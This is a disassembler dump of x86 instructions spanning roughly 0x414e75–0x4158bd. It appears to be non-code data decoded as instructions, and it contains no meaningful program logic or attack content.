  414e75:	mov    edi,0x79b24597
  414e7a:	test   al,0x3c
  414e7c:	xchg   ebx,eax
  414e7d:	popa   
  414e7e:	pop    ds
  414e7f:	inc    ebx
  414e80:	jnp    0x414e9d
  414e82:	and    ebp,ecx
  414e84:	nop
  414e85:	xchg   esp,eax
  414e86:	sub    DWORD PTR [eax+ecx*4-0x39bbdaf1],ecx
  414e8d:	sbb    ebx,DWORD PTR [eax-0x75]
  414e90:	aaa    
  414e91:	mov    dh,cl
  414e93:	and    bh,BYTE PTR [eax+0x109e8239]
  414e99:	mov    ds:0x2788770f,al
  414e9e:	scas   al,BYTE PTR es:[edi]
  414e9f:	jbe    0x414ea4
  414ea1:	dec    ebp
  414ea2:	cli    
  414ea3:	push   ebx
  414ea4:	push   eax
  414ea5:	fadd   QWORD PTR [eax]
  414ea7:	retf   
  414ea8:	shl    ecx,cl
  414eaa:	push   0x7a0473ff
  414eaf:	pop    ds
  414eb0:	mov    dh,0xd8
  414eb2:	aad    0xde
  414eb4:	and    ecx,DWORD PTR [esi+0x746546ab]
  414eba:	popa   
  414ebb:	rcl    DWORD PTR [eax],1
  414ebd:	sahf   
  414ebe:	push   ebx
  414ebf:	sbb    dl,cl
  414ec1:	cmp    eax,0xae80b24e
  414ec6:	dec    edx
  414ec7:	xor    eax,DWORD PTR [ebp+esi*8-0x45]
  414ecb:	xchg   edi,eax
  414ecc:	int    0x1d
  414ece:	out    dx,eax
  414ecf:	loopne 0x414ee7
  414ed1:	push   esi
  414ed2:	ret    0x2812
  414ed5:	aad    0x82
  414ed7:	sbb    edi,DWORD PTR [edi-0x51c58cc0]
  414edd:	pop    edx
  414ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414edf:	scas   al,BYTE PTR es:[edi]
  414ee0:	adc    dl,0xfe
  414ee3:	mov    bh,0x5d
  414ee5:	mov    dl,BYTE PTR [eax+0x11]
  414ee8:	adc    eax,0x6be91db0
  414eed:	in     al,dx
  414eee:	or     BYTE PTR [ebx],ch
  414ef0:	or     al,0xa4
  414ef2:	xor    al,0xec
  414ef4:	mov    ebp,0xe1c733da
  414ef9:	mov    ebx,0xfaafd12b
  414efe:	rcl    BYTE PTR [ecx],1
  414f00:	mov    ebx,DWORD PTR [ebp-0x27267c11]
  414f06:	push   eax
  414f07:	idiv   ecx
  414f09:	jae    0x414eb2
  414f0b:	mov    fs,eax
  414f0d:	adc    eax,0x9506
	...
  414f72:	add    BYTE PTR [eax],al
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd08:0x6ff6a027
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    al,0x1
  414f8a:	add    BYTE PTR [eax],al
  414f8c:	gs (bad) 
  414f8e:	fnsave [ecx]
  414f90:	es mov esp,0xac15f535
  414f96:	stos   DWORD PTR es:[edi],eax
  414f97:	and    DWORD PTR [edi],esi
  414f99:	and    al,0x61
  414f9b:	mov    BYTE PTR [eax-0x15fe3837],ah
  414fa1:	pop    edi
  414fa2:	jl     0x414f8c
  414fa4:	dec    ebx
  414fa5:	push   esi
  414fa6:	fnsave [ebx]
  414fa8:	test   al,0x1f
  414faa:	rcl    DWORD PTR [ecx],0x59
  414fad:	les    esi,FWORD PTR [ecx+0x400c8a4f]
  414fb3:	inc    ecx
  414fb4:	leave  
  414fb5:	mov    esi,0x2c59f7fa
  414fba:	sar    ecx,cl
  414fbc:	xor    ah,BYTE PTR [ebx-0x23fbd7f3]
  414fc2:	sahf   
  414fc3:	lea    ecx,[eax-0x3c6e3603]
  414fc9:	icebp  
  414fca:	push   es
  414fcb:	and    BYTE PTR [esi+0x27],bh
  414fce:	out    0xbf,eax
  414fd0:	push   0x1c
  414fd2:	or     bh,BYTE PTR [ebx+0x4ef045d9]
  414fd8:	or     eax,0x62b13c37
  414fdd:	mov    bh,0xd5
  414fdf:	jno    0x414f6d
  414fe1:	scas   al,BYTE PTR es:[edi]
  414fe2:	loopne 0x41503d
  414fe4:	cld    
  414fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fe6:	or     ch,al
  414fe8:	sub    ebp,ebx
  414fea:	paddsw mm3,mm2
  414fed:	in     al,0xe4
  414fef:	xchg   ebp,eax
  414ff0:	mov    ebp,es
  414ff2:	fld    QWORD PTR [ebp+0x1ec50ad9]
  414ff8:	test   BYTE PTR [edi+edx*2+0x28364265],0xc0
  415000:	mov    al,ds:0x435f41aa
  415005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415006:	cmp    eax,DWORD PTR [eax+0x64e0c16e]
  41500c:	(bad)  
  41500d:	or     BYTE PTR [edx-0x73],ah
  415010:	shl    DWORD PTR [ecx],cl
  415012:	xor    DWORD PTR [edx+0x28],0x36c39f0e
  415019:	sahf   
  41501a:	lahf   
  41501b:	sbb    eax,DWORD PTR [edi+eax*8-0x23]
  41501f:	xchg   BYTE PTR [ebp-0x8],dh
  415022:	jle    0x414fb1
  415024:	pop    es
  415025:	mov    BYTE PTR [ebp-0x54],bl
  415028:	mov    eax,0xc8589ffc
  41502d:	adc    BYTE PTR ds:0x402bf3d1,0x56
  415034:	iret   
  415035:	adc    BYTE PTR [eax],0xa2
  415038:	lahf   
  415039:	(bad)  
  41503a:	std    
  41503b:	into   
  41503c:	pop    ds
  41503d:	inc    esp
  41503e:	leave  
  41503f:	retf   
  415040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415041:	xor    eax,edx
  415043:	or     eax,0xf66d42b8
  415048:	cld    
  415049:	mov    dl,0x19
  41504b:	mov    bl,0x7a
  41504d:	outs   dx,BYTE PTR ds:[esi]
  41504e:	jno    0x4150ab
  415050:	scas   al,BYTE PTR es:[edi]
  415051:	shl    DWORD PTR [ecx-0x68],cl
  415054:	dec    esi
  415055:	lea    edi,[ebx-0x80]
  415058:	mov    ebx,0xeb278656
  41505d:	xor    BYTE PTR [ecx+0x4f],cl
  415060:	inc    esp
  415061:	aad    0x32
  415063:	test   DWORD PTR [esi-0xf],eax
  415066:	int3   
  415067:	mov    ebx,0x1089799f
  41506c:	rcl    DWORD PTR [edi+0x10],0x27
  415070:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415071:	in     al,0x88
  415073:	gs push eax
  415075:	leave  
  415076:	popa   
  415077:	and    ebp,DWORD PTR [ecx]
  415079:	ja     0x41501a
  41507b:	xor    DWORD PTR [edi-0x4348fa74],esi
  415081:	mov    ebx,0x103f9a25
  415086:	pop    ds
  415087:	xor    BYTE PTR [ebp*1+0x15657df5],dh
  41508e:	pop    ds
  41508f:	fld    QWORD PTR [eax]
	...
  4150f1:	add    BYTE PTR [eax],al
  4150f3:	add    BYTE PTR [ebx+0x2],bh
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xc1dafc2d
  415102:	pop    ebp
  415103:	xchg   esi,eax
  415104:	or     al,0xde
  415106:	add    BYTE PTR [eax],al
  415108:	add    al,0x1
  41510a:	add    BYTE PTR [eax],al
  41510c:	push   ebp
  41510d:	scas   al,BYTE PTR es:[edi]
  41510e:	aam    0xa6
  415110:	lods   al,BYTE PTR ds:[esi]
  415111:	stos   DWORD PTR es:[edi],eax
  415112:	sub    edx,ebp
  415114:	adc    bl,BYTE PTR [ecx+0x14]
  415117:	adc    DWORD PTR [edx+0x9ed756b],eax
  41511d:	dec    ebp
  41511e:	pop    ebx
  41511f:	sti    
  415120:	lods   eax,DWORD PTR ds:[esi]
  415121:	(bad)  
  415122:	xchg   esp,eax
  415123:	or     edx,DWORD PTR [edx+0x22cccda1]
  415129:	iret   
  41512a:	lds    edi,FWORD PTR [ecx+ecx*2+0x7ba7ca79]
  415131:	jecxz  0x41519a
  415133:	loopne 0x41514a
  415135:	fld    DWORD PTR [esi-0x7accbacb]
  41513b:	scas   al,BYTE PTR es:[edi]
  41513c:	pop    esp
  41513d:	dec    DWORD PTR [edi+0x4f]
  415140:	mov    bl,0x89
  415142:	out    dx,eax
  415143:	adc    ah,BYTE PTR [ebx-0x3e0526cf]
  415149:	ror    BYTE PTR [edi-0x6],cl
  41514c:	and    esi,DWORD PTR [ebx]
  41514e:	hlt    
  41514f:	sbb    BYTE PTR ds:0xeda86236,0x79
  415156:	adc    DWORD PTR [edx],edi
  415158:	jne    0x415158
  41515a:	xor    DWORD PTR [edx+0x50],0xa61be93
  415161:	jnp    0x4151b6
  415163:	inc    edx
  415164:	in     al,0xf4
  415166:	inc    esi
  415167:	inc    ebp
  415168:	pmaddwd mm1,QWORD PTR [ebp+0x457b13b1]
  41516f:	mov    WORD PTR [ebx-0x9],ds
  415172:	fcmovne st,st(7)
  415174:	loopne 0x415131
  415176:	mov    ds:0xcff923b5,eax
  41517b:	sbb    esp,DWORD PTR [ebp-0x564604b1]
  415181:	cmp    ebx,DWORD PTR [edi]
  415183:	jg     0x4151ea
  415185:	pop    es
  415186:	and    esi,DWORD PTR [edi-0x55b350c2]
  41518c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41518d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41518e:	adc    ah,BYTE PTR [esi+0x22381c8f]
  415194:	in     eax,dx
  415195:	aas    
  415196:	mov    dl,0x56
  415198:	inc    edx
  415199:	pop    eax
  41519a:	mov    al,ds:0x7304981
  41519f:	mov    ebp,0xe61f55e1
  4151a4:	dec    esp
  4151a5:	outs   dx,DWORD PTR ds:[esi]
  4151a6:	jp     0x415206
  4151a8:	cmp    BYTE PTR [esi+edx*4-0x5a876306],0xd
  4151b0:	sub    bh,0x5b
  4151b3:	dec    edx
  4151b4:	mov    ebp,0x7fc59ed0
  4151b9:	imul   edx,DWORD PTR [ecx],0xa40e2dee
  4151bf:	xchg   edi,eax
  4151c0:	retf   
  4151c1:	and    esi,edx
  4151c3:	sbb    DWORD PTR [esi-0x1],0xffffffca
  4151c7:	ins    BYTE PTR es:[edi],dx
  4151c8:	push   esi
  4151c9:	fadd   DWORD PTR [ecx+0x7583975]
  4151cf:	call   0xbaf7ee56
  4151d4:	push   es
  4151d5:	pop    ss
  4151d6:	adc    BYTE PTR [ecx+0x6a],al
  4151d9:	fstp   TBYTE PTR [eax-0x59]
  4151dc:	and    eax,eax
  4151de:	adc    DWORD PTR [edi],edx
  4151e0:	sub    ch,BYTE PTR [eax*2+0x9380268]
  4151e7:	xor    al,0x8c
  4151e9:	lock sub al,0x81
  4151ec:	sub    eax,0x1fd99a9c
  4151f1:	mov    esp,0xd2a6f364
  4151f6:	jmp    0x5093:0xbb6a4c75
  4151fd:	aam    0x62
  4151ff:	cmp    DWORD PTR [ebx+0x36],ecx
  415202:	add    DWORD PTR [ecx],esp
  415204:	pop    esi
  415205:	fnstcw WORD PTR [edx-0x46]
  415208:	mov    al,BYTE PTR [esi+0x162c853c]
  41520e:	fucom  st(4)
	...
  415274:	sub    al,0x97
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x76bb940b
  415283:	loope  0x415295
  415285:	fild   WORD PTR [eax]
  415287:	add    BYTE PTR [ecx+eax*1],al
  41528a:	add    BYTE PTR [eax],al
  41528c:	fidiv  WORD PTR [edx+edi*4]
  41528f:	mov    DWORD PTR [ebx+0x4ce401c4],ebp
  415295:	mov    al,0x8f
  415297:	push   ds
  415298:	imul   edi,DWORD PTR [ebp+0x2a49abe1],0xdc40d3cf
  4152a2:	or     BYTE PTR [edi],al
  4152a4:	push   ebp
  4152a5:	popf   
  4152a6:	xor    dh,0xa2
  4152a9:	mov    eax,0x76ba81c
  4152ae:	psrlw  mm1,QWORD PTR [ecx-0x73597160]
  4152b5:	jo     0x415273
  4152b7:	(bad)  
  4152b8:	cmp    edi,DWORD PTR [ebp+0xa]
  4152bb:	xchg   esp,eax
  4152bc:	pop    ds
  4152bd:	(bad)  
  4152be:	push   edx
  4152bf:	adc    ebx,ecx
  4152c1:	mov    esp,0xec9eb3be
  4152c6:	je     0x4152bb
  4152c8:	jb     0x415336
  4152ca:	push   es
  4152cb:	push   ebx
  4152cc:	jg     0x415297
  4152ce:	mov    eax,0x4431b272
  4152d3:	dec    eax
  4152d4:	dec    edx
  4152d5:	push   ecx
  4152d6:	mov    ah,0xeb
  4152d8:	jge    0x415285
  4152da:	sub    BYTE PTR [ecx+0x637806f9],bl
  4152e0:	and    al,0xdd
  4152e2:	or     DWORD PTR [esi],ebp
  4152e4:	adc    dl,BYTE PTR [edx-0x2f]
  4152e7:	fimul  DWORD PTR [esi+0x47]
  4152ea:	outs   dx,DWORD PTR ds:[esi]
  4152eb:	pop    esp
  4152ec:	stos   DWORD PTR es:[edi],eax
  4152ed:	mov    ah,0x3e
  4152ef:	push   ebp
  4152f0:	arpl   WORD PTR [edx-0xe8d486d],ax
  4152f6:	add    bl,bh
  4152f8:	lods   eax,DWORD PTR ds:[esi]
  4152f9:	push   ss
  4152fa:	mov    bl,0xe
  4152fc:	imul   eax,DWORD PTR [eax+0x1d],0xf92417e8
  415303:	(bad)  [ebp+0x66]
  415306:	jle    0x4152e2
  415308:	mov    bh,0x82
  41530a:	clc    
  41530b:	jmp    0x415305
  41530d:	cs add eax,0x80d2a4a
  415313:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415314:	(bad)  
  415315:	hlt    
  415316:	cwde   
  415317:	test   BYTE PTR [ebx+0x6086b777],bl
  41531d:	lahf   
  41531e:	sbb    esi,ecx
  415320:	je     0x41534f
  415322:	cdq    
  415323:	fcmovbe st,st(3)
  415325:	xor    al,0x3f
  415327:	inc    esp
  415328:	mov    ds:0x6f3e0862,al
  41532d:	jb     0x415364
  41532f:	rcl    BYTE PTR [esi+ecx*1+0x618e0855],0xbe
  415337:	(bad)  
  415338:	cs fwait
  41533a:	add    esp,esi
  41533c:	and    DWORD PTR [edx+0xfbf25fd],edx
  415342:	cmp    edi,ebx
  415344:	adc    al,0xee
  415346:	test   al,0x13
  415348:	jg     0x4152ec
  41534a:	fisubr DWORD PTR [ebx-0x357b1c62]
  415350:	(bad)  
  415351:	dec    ecx
  415352:	ins    BYTE PTR es:[edi],dx
  415353:	sub    al,BYTE PTR [ecx]
  415355:	sbb    bl,cl
  415357:	sub    ecx,ebx
  415359:	jo     0x4153cd
  41535b:	pop    edi
  41535c:	dec    esi
  41535d:	outs   dx,BYTE PTR ds:[esi]
  41535e:	xor    dh,BYTE PTR [ebp-0x5]
  415361:	ss stos DWORD PTR es:[edi],eax
  415363:	inc    ebx
  415364:	loopne 0x4153a3
  415366:	jo     0x4153de
  415368:	arpl   WORD PTR [edx],si
  41536a:	add    DWORD PTR [ebp-0x252f8bf6],eax
  415370:	cli    
  415371:	or     ah,0x4b
  415374:	data16 daa 
  415376:	inc    ecx
  415377:	lea    ebp,[edx-0xb]
  41537a:	test   DWORD PTR [ebx+0x46],eax
  41537d:	and    ch,al
  41537f:	mov    bl,al
  415381:	xor    DWORD PTR [esi+esi*2-0x491bf088],ebp
  415388:	fcmovbe st,st(3)
  41538a:	push   0x5871093e
  41538f:	push   ss
	...
  4153f4:	ins    DWORD PTR es:[edi],dx
  4153f5:	lock repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0x1bd3e5b0
  415401:	outs   dx,BYTE PTR ds:[esi]
  415402:	mov    WORD PTR ds:0xe014,gs
  415408:	add    al,0x1
  41540a:	add    BYTE PTR [eax],al
  41540c:	test   BYTE PTR [eax+0x22],0xf0
  415410:	and    al,0x9
  415412:	retf   
  415413:	xchg   edx,eax
  415414:	pop    es
  415415:	popa   
  415416:	mov    eax,ds:0x2f461ff7
  41541b:	push   ds
  41541c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41541d:	ds (bad) 
  41541f:	mov    DWORD PTR [eax+eiz*8],edx
  415422:	mov    DWORD PTR [ebp-0x19201a52],ebp
  415428:	arpl   WORD PTR [esi],di
  41542a:	cmp    ch,BYTE PTR [edx]
  41542c:	(bad)  
  41542d:	enterw 0x15bc,0xa7
  415432:	and    eax,0x2a1da02b
  415437:	inc    ecx
  415438:	mov    ah,0x16
  41543a:	mov    bh,0xe1
  41543c:	in     al,0xb2
  41543e:	xor    edx,DWORD PTR [eiz*4-0xaa07bb7]
  415445:	ds (bad) 
  415448:	aas    
  415449:	push   ebp
  41544a:	mov    ch,0x9f
  41544c:	sbb    eax,0x3b6b8365
  415451:	mov    al,dl
  415453:	imul   ebp,ebp,0xf54c4348
  415459:	inc    esp
  41545a:	xor    al,0x73
  41545c:	cli    
  41545d:	jns    0x4154b1
  41545f:	sub    eax,0xa3eb670e
  415464:	dec    ebx
  415465:	lods   eax,DWORD PTR ds:[esi]
  415466:	xchg   edi,eax
  415467:	leave  
  415468:	xor    DWORD PTR ds:0x84c16775,esi
  41546e:	scas   eax,DWORD PTR es:[edi]
  41546f:	test   eax,0xa04cdf42
  415474:	popa   
  415475:	push   ebp
  415476:	mov    ebp,0x89e30506
  41547b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41547c:	pushf  
  41547d:	pop    es
  41547e:	or     al,cl
  415480:	sub    dl,al
  415482:	jae    0x415442
  415484:	pop    eax
  415485:	mov    ds:0x5587710e,eax
  41548a:	and    BYTE PTR [ebp+0xc],dh
  41548d:	pop    edi
  41548e:	sub    BYTE PTR [esi-0x42f9498b],bl
  415494:	shr    DWORD PTR [edi+0x25dbc28e],cl
  41549a:	sti    
  41549b:	xor    al,0xd9
  41549d:	shr    ebx,1
  41549f:	adc    al,0xac
  4154a1:	and    cl,BYTE PTR [ebx-0x34]
  4154a4:	jge    0x41544d
  4154a6:	and    edi,DWORD PTR [ebx-0x78fc1e0c]
  4154ac:	sbb    bl,bl
  4154ae:	aas    
  4154af:	jecxz  0x415477
  4154b1:	leave  
  4154b2:	sub    al,0xc5
  4154b4:	cmp    BYTE PTR [ebx],cl
  4154b6:	or     DWORD PTR [ecx-0x4b179e86],eax
  4154bc:	sub    al,0x6b
  4154be:	cs mov edx,0xb55fb51d
  4154c4:	test   al,0xb1
  4154c6:	or     DWORD PTR [esp+ebx*4+0x9d3c355],0x35e4e903
  4154d1:	sbb    BYTE PTR [eax+edi*2],0xc8
  4154d5:	xchg   BYTE PTR [esi+0x288be1a6],dh
  4154db:	js     0x4154c3
  4154dd:	out    dx,eax
  4154de:	scas   eax,DWORD PTR es:[edi]
  4154df:	sub    eax,0x4b89adb7
  4154e4:	dec    eax
  4154e5:	inc    esp
  4154e6:	(bad)  
  4154e7:	cmp    cl,dh
  4154e9:	call   0x9677:0x4a60f49f
  4154f0:	hlt    
  4154f1:	jmp    0x1dc5:0x8c38
  4154f7:	jmp    0xefa77cdd
  4154fc:	int3   
  4154fd:	cmp    ecx,DWORD PTR [ebx-0x77e2251c]
  415503:	add    esi,esp
  415505:	xor    eax,ebp
  415507:	jmp    0x415576
  415509:	pop    ds
  41550a:	and    edx,DWORD PTR [edx]
  41550c:	data16 jecxz 0x415588
  41550f:	mov    al,0x0
	...
  415571:	add    BYTE PTR [eax],al
  415573:	add    ah,ah
  415575:	lock sub DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x415525
  415581:	sti    
  415582:	test   BYTE PTR [eax+ebx*1+0x40000e1],al
  415589:	add    DWORD PTR [eax],eax
  41558b:	add    dh,dh
  41558d:	push   0xe9e6f07c
  415592:	mov    edx,DWORD PTR ds:0x5189f8a8
  415598:	jl     0x4155ef
  41559a:	xor    al,ah
  41559c:	outs   dx,DWORD PTR ds:[esi]
  41559d:	ss add al,0xfb
  4155a0:	push   ebx
  4155a1:	rcl    BYTE PTR [edx+0x78],1
  4155a4:	fscale 
  4155a6:	mov    esp,ecx
  4155a8:	sysexit 
  4155aa:	sub    al,0xb
  4155ac:	jecxz  0x415606
  4155ae:	pop    esp
  4155af:	pop    ss
  4155b0:	jne    0x4155e4
  4155b2:	sbb    eax,DWORD PTR [ecx+0x58cc6fed]
  4155b8:	in     al,dx
  4155b9:	int3   
  4155ba:	mov    esi,0x8bd9a9f4
  4155bf:	xchg   DWORD PTR [edi],ecx
  4155c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155c2:	rcr    DWORD PTR [edx-0xb],0x76
  4155c6:	ins    BYTE PTR es:[edi],dx
  4155c7:	dec    ebp
  4155c8:	outs   dx,BYTE PTR ds:[esi]
  4155c9:	adc    ah,ch
  4155cb:	inc    ebp
  4155cc:	je     0x415623
  4155ce:	push   0xffffffcd
  4155d0:	je     0x4155ba
  4155d2:	ins    BYTE PTR es:[edi],dx
  4155d3:	pop    ecx
  4155d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155d5:	je     0x415635
  4155d7:	adc    al,BYTE PTR [ebx]
  4155d9:	cmp    cl,BYTE PTR [ecx+0x1b215968]
  4155df:	xchg   DWORD PTR [ebp-0x3d],edi
  4155e2:	jecxz  0x4155f9
  4155e4:	mov    ch,0xd1
  4155e6:	cmp    al,0x5f
  4155e8:	int3   
  4155e9:	dec    edi
  4155ea:	jno    0x4155c4
  4155ec:	into   
  4155ed:	dec    ecx
  4155ee:	dec    edx
  4155ef:	loop   0x415624
  4155f1:	mov    al,0x47
  4155f3:	pop    es
  4155f4:	icebp  
  4155f5:	popf   
  4155f6:	sub    DWORD PTR [eax-0x1f],eax
  4155f9:	push   eax
  4155fa:	add    al,bl
  4155fc:	push   es
  4155fd:	lock sub eax,0x7ff71d8e
  415603:	xor    edx,DWORD PTR [esi]
  415605:	popf   
  415606:	imul   edi,DWORD PTR [ebx-0x3],0x9672aef4
  41560d:	shl    BYTE PTR [esi],cl
  41560f:	loop   0x41559f
  415611:	push   ss
  415612:	test   DWORD PTR [ebp+eax*4+0x1b3bac6f],eax
  415619:	inc    eax
  41561a:	in     al,dx
  41561b:	dec    ebx
  41561c:	ss inc edx
  41561e:	or     ecx,DWORD PTR [edi]
  415620:	daa    
  415621:	scas   al,BYTE PTR es:[edi]
  415622:	xlat   BYTE PTR ds:[ebx]
  415623:	lods   al,BYTE PTR ds:[esi]
  415624:	xchg   ebx,eax
  415625:	jge    0x41560e
  415627:	mul    DWORD PTR ds:0x60abccfa
  41562d:	add    al,0xd2
  41562f:	mov    eax,0x8ab6d0e1
  415634:	cmc    
  415635:	loope  0x415664
  415637:	stc    
  415638:	(bad)  
  415639:	(bad)  
  41563a:	mov    ds:0x7b166226,al
  41563f:	cmp    DWORD PTR [eax-0x7c],eax
  415642:	jne    0x4156b2
  415644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415645:	mov    edx,0xe1304359
  41564a:	in     al,0x1d
  41564c:	mov    WORD PTR [ebx+0x57],gs
  41564f:	fcom   QWORD PTR [edx+0x79]
  415652:	outs   dx,DWORD PTR ds:[esi]
  415653:	inc    ebp
  415654:	test   BYTE PTR [eax],0x20
  415657:	add    ebx,ebx
  415659:	ss dec edi
  41565b:	sbb    BYTE PTR [ebp+0x518ce678],ch
  415661:	cs stos DWORD PTR es:[edi],eax
  415663:	xchg   edx,eax
  415664:	outs   dx,BYTE PTR ds:[esi]
  415665:	icebp  
  415666:	or     ebp,DWORD PTR [ebx-0x633d6fe2]
  41566c:	lock fistp WORD PTR ss:[eax-0x724cd230]
  415674:	and    al,0xbc
  415676:	pop    eax
  415677:	jno    0x4156da
  415679:	cmp    ch,dh
  41567b:	in     al,dx
  41567c:	out    dx,eax
  41567d:	lahf   
  41567e:	sub    BYTE PTR [edx],dh
  415680:	dec    ebp
  415681:	fwait
  415682:	sbb    al,dl
  415684:	dec    edx
  415685:	in     al,0xe1
  415687:	jmp    0x41569d
  415689:	ins    DWORD PTR es:[edi],dx
  41568a:	add    ah,dh
  41568c:	div    BYTE PTR [ecx+0x2b]
  41568f:	jno    0x415691
	...
  4156f1:	add    BYTE PTR [eax],al
  4156f3:	add    BYTE PTR [ebp-0x66],ch
  4156f6:	mov    esp,0xfd67ff45
  4156fb:	mov    edx,0x2c46bab3
  415700:	mov    ?,ebp
  415702:	push   esp
  415703:	adc    DWORD PTR [edx+eiz*8],ebx
  415706:	add    BYTE PTR [eax],al
  415708:	add    al,0x1
  41570a:	add    BYTE PTR [eax],al
  41570c:	aad    0x6f
  41570e:	enter  0x7297,0x8e
  415712:	mov    edi,DWORD PTR [edx]
  415714:	jno    0x41577c
  415716:	push   eax
  415717:	aad    0x65
  415719:	enter  0x6a7f,0xac
  41571d:	test   eax,0x91bb9d53
  415722:	loope  0x4156bc
  415724:	ret    
  415725:	jb     0x4156d3
  415727:	xlat   BYTE PTR ds:[ebx]
  415728:	mov    eax,ds:0xa007a738
  41572d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41572e:	cwde   
  41572f:	fs ss mov ebp,0xa595e68b
  415736:	sub    BYTE PTR [edx+0x7e],dl
  415739:	fdivrp st(3),st
  41573b:	in     eax,dx
  41573c:	xchg   esp,eax
  41573d:	pop    eax
  41573e:	int    0x3
  415740:	or     eax,0x30c4cd14
  415745:	fldenv [ebx-0x4719b7e9]
  41574b:	xor    dl,0xc7
  41574e:	jbe    0x415750
  415750:	popf   
  415751:	or     al,0x7b
  415753:	loope  0x415778
  415755:	cdq    
  415756:	fwait
  415757:	inc    ebp
  415758:	out    0x75,eax
  41575a:	push   0x75
  41575c:	cmp    BYTE PTR [edi],0xb4
  41575f:	jb     0x41577e
  415761:	icebp  
  415762:	mov    cs,edi
  415764:	mov    eax,ds:0x4dba8936
  415769:	aad    0xe8
  41576b:	jl     0x415790
  41576d:	pop    edx
  41576e:	cli    
  41576f:	arpl   WORD PTR [ebx+0x1c],dx
  415772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415773:	and    ebx,DWORD PTR [edx+0x11]
  415776:	mov    bh,bl
  415778:	add    eax,0xf522a015
  41577d:	add    eax,0x1dcc461f
  415782:	mov    ds:0x769870f2,al
  415787:	mov    ebp,0x8ee1ec23
  41578c:	gs add al,0x94
  41578f:	jmp    0x4520:0x33b13cce
  415796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415797:	jp     0x415738
  415799:	out    0xef,al
  41579b:	popa   
  41579c:	or     BYTE PTR [ebx-0x70],cl
  41579f:	imul   ebp,esp,0x1c316278
  4157a5:	lods   al,BYTE PTR ds:[esi]
  4157a6:	aam    0x91
  4157a8:	cmp    DWORD PTR [ecx],ebx
  4157aa:	pusha  
  4157ab:	add    esi,0x7678a309
  4157b1:	xor    edi,ecx
  4157b3:	aad    0x97
  4157b5:	loope  0x415749
  4157b7:	push   ebx
  4157b8:	xchg   edx,eax
  4157b9:	sub    DWORD PTR [eax],edi
  4157bb:	xor    DWORD PTR [esi],ebx
  4157bd:	inc    esp
  4157be:	test   dl,dl
  4157c0:	sbb    BYTE PTR [edi],dh
  4157c2:	jbe    0x4157be
  4157c4:	mov    dh,0x1f
  4157c6:	pop    edx
  4157c7:	sbb    al,0x62
  4157c9:	fidivr WORD PTR [edx]
  4157cb:	mov    eax,ds:0x10fe2d80
  4157d0:	xor    edx,DWORD PTR gs:[edx]
  4157d3:	cmp    al,0xc2
  4157d5:	adc    DWORD PTR [ecx+0x3743b0c4],edx
  4157db:	mov    ebx,0xab114fb2
  4157e0:	loopne 0x415765
  4157e2:	repnz fdiv st(0),st
  4157e5:	add    al,0x30
  4157e7:	sbb    al,0xb7
  4157e9:	stc    
  4157ea:	(bad)  
  4157eb:	mov    dl,0xc9
  4157ed:	xor    al,0x48
  4157ef:	lods   al,BYTE PTR ds:[esi]
  4157f0:	sahf   
  4157f1:	nop
  4157f2:	mov    ecx,0xfb7a8147
  4157f7:	jno    0x4157c6
  4157f9:	outs   dx,BYTE PTR ds:[esi]
  4157fa:	mov    esp,0xb41a8e75
  4157ff:	mov    DWORD PTR [ebx+ebp*4-0x7],edi
  415803:	dec    eax
  415804:	push   0x7a
  415806:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415807:	xchg   esi,eax
  415808:	mov    ss,WORD PTR [edi+0x762a9da]
  41580e:	and    eax,0x82
	...
  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	shl    DWORD PTR ds:0x208d1683,cl
  415885:	jecxz  0x415887
  415887:	add    BYTE PTR [ecx+eax*1],al
  41588a:	add    BYTE PTR [eax],al
  41588c:	xchg   esi,eax
  41588d:	or     BYTE PTR [esi],dh
  41588f:	loope  0x4158d0
  415891:	fdivr  QWORD PTR [edi+0x6a048146]
  415897:	daa    
  415898:	dec    ebp
  415899:	cmp    al,0xb9
  41589b:	outs   dx,DWORD PTR ds:[esi]
  41589c:	dec    esi
  41589d:	sti    
  41589e:	xchg   esp,eax
  41589f:	test   edx,esp
  4158a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158a2:	mul    ch
  4158a4:	das    
  4158a5:	push   ebx
  4158a6:	jg     0x41585d
  4158a8:	sub    dl,BYTE PTR [esi+edi*1]
  4158ab:	icebp  
  4158ac:	pop    esp
  4158ad:	je     0x415903
  4158af:	mov    eax,ds:0x9849055
  4158b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158b5:	pop    esi
  4158b6:	loope  0x415879
  4158b8:	adc    BYTE PTR [ebx-0xf],al
  4158bb:	jbe    0x415906
  4158bd:	or     al,BYTE PTR ss:[edi+0x3d0ac4b]
